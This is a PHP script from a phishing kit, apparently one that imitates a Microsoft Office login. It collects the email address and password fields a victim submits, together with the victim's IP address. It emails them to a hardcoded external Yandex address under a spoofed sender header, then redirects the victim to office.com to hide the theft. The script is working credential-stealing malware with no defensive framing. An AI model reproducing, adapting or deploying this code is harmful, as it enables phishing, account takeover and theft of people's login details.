<?php header('Access-Control-Allow-Origin: *'); ?>
<?php

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------------CP-----------------------\n";
$message .= "User            : ".$_POST['email']."\n";
$message .= "Password            : ".$_POST['pwd']."\n";
$message .= "Password            : ".$_POST['v_pwd']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Country : ".$_POST['userIP']."\n\n";
$message .= "Date: ".$adddate."\n";
$message .= "-------SMILE------\n";
$send = "whelas8@yandex.com";
$subject = "OFF - $ip";
$headers = "From: OFF<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
header("Location: https://www.office.com/");
?>1